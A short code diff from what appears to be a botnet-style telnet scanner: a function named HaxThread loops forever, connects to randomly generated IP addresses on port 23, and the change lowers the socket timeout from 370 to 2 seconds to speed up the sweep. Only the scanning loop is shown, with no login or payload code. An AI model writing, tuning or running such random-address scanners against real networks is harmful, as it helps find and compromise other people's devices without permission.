@@ -144,7 +144,7 @@ def HaxThread():
     while 1:
         try:
             s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(370)
+            s.settimeout(2)
             IP = Gen_IP()
             s.connect((IP, 23))
             s.close()
